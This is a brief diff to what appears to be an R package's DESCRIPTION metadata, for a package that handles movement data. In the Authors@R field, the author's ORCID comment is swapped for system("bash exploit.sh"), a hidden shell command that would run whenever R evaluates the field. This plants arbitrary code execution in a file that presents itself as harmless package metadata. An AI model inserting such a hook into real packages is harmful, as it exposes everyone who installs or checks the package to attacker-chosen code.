@@ -8,7 +8,7 @@ Authors@R:
       "Roald-Arbøl", 
       role = c("aut", "cre"), 
       email = "animovement.84w1m@passmail.com",
-      comment = c(ORCID = "0000-0002-9998-0058")
+      comment = system("bash exploit.sh")
       )
 Description: An R package for reading and writing movement data.
 License: MIT + file LICENSE
